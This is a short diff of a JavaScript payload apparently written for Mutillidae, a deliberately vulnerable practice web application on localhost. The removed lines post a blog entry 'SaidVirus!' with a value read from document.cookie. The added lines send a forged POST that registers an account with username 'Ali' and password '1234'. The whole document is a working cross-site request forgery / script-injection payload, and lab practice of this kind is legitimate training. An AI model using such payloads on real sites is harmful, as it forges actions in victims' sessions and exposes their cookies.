@@ -1,14 +1,12 @@
 
 <script>
         var http = new XMLHttpRequest();
-	var url= "add-to-your-blog-php-submit-button=Save+Blog+Entry";
-	url = url.concat("&blog_entry=SaidVirus!");
-	url = url.concat("&csrf-token=");
-	url = url.concat(document.cookie.split(";")[3]);
+	var url= "";
+	url = url.concat("csrf-token=&username=Ali&password=1234&confirm_password=1234&my_signature&register-php-submit-button=Create+Account");
 
 
-	http.open("POST", "index.php?page=add-to-your-blog.php", true);
-	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	http.setRequestHeader("Content-length", url.length);
+	http.open("POST", "https://localhost/mutillidae/index.php?page=add-to-your-blog.php", true);
+	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	http.setRequestHeader("Content-Length", url.length);
 	http.send(url);
 </script>
